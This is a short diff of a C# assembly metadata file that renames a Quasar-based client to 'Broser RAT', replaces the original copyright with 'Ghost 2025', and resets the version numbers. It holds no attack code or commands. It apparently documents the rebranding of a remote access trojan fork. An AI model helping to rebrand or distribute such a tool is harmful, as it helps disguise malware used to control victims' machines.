@@ -9,8 +9,8 @@ using System.Runtime.InteropServices;
 [assembly: AssemblyDescription("")]
 [assembly: AssemblyConfiguration("")]
 [assembly: AssemblyCompany("")]
-[assembly: AssemblyProduct("Quasar")]
-[assembly: AssemblyCopyright("Copyright © MaxXor 2023")]
+[assembly: AssemblyProduct("Broser RAT")]
+[assembly: AssemblyCopyright("Copyright © Ghost 2025")]
 [assembly: AssemblyTrademark("")]
 [assembly: AssemblyCulture("")]
 [assembly: InternalsVisibleTo("Client.Tests")]
@@ -30,5 +30,5 @@ using System.Runtime.InteropServices;
 // Sie können alle Werte angeben oder die standardmäßigen Build- und Revisionsnummern 
 // übernehmen, indem Sie "*" eingeben:
 // [assembly: AssemblyVersion("1.0.*")]
-[assembly: AssemblyVersion("1.4.1")]
-[assembly: AssemblyFileVersion("1.4.1")]
+[assembly: AssemblyVersion("1.1.0")]
+[assembly: AssemblyFileVersion("1.1.0")]
